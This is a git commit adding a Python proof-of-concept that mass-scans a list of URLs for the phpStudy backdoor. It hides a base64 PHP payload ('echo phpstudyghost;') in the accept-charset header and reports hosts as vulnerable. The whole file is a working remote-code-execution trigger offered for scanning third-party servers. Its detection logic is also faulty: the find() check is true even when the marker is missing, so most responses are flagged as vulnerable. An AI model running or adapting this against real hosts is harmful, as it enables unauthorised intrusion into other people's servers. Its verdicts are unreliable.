2d3a078e18d487acbba998d85d95dea6484e5507
ph4ntom <ph4ntom11235@gmail.com>
2019-09-27 11:46:50 +0800

    Create psghost_poc.py

---
+++ psghost_poc.py
@@ -0,0 +1,41 @@
+# !/usr/bin/env python
+# -*- coding:utf-8 -*-
+
+import gevent
+from gevent import monkey
+
+gevent.monkey.patch_all()
+import requests as rq
+
+
+def file_read(file_name="url.txt"):
+    with open(file_name, "r") as f:
+        return [i.replace("\n", "") for i in f.readlines()]
+
+
+def check(url):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-User': '?1',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
+        'Sec-Fetch-Site': 'none',
+        'accept-charset': 'ZWNobyUyMHBocHN0dWR5Z2hvc3QlM0I=',
+        'Accept-Encoding': 'gzip,deflate',
+        'Accept-Language': 'zh-CN,zh;q=0.9',
+    }
+    try:
+        res = rq.get(url, headers=headers, timeout=20)
+        if res.status_code == 200:
+            if res.text.find('phpstudyghost'):
+                print("[存在漏洞] " + url)
+    except:
+        print("[超时] " + url)
+
+
+if __name__ == '__main__':
+    input("任意按键开始执行..")
+    tasks = [gevent.spawn(check, url) for url in file_read()]
+    print("正在执行...请等候")
+    gevent.joinall(tasks)
+    wait = input("执行完毕 任意键退出...")
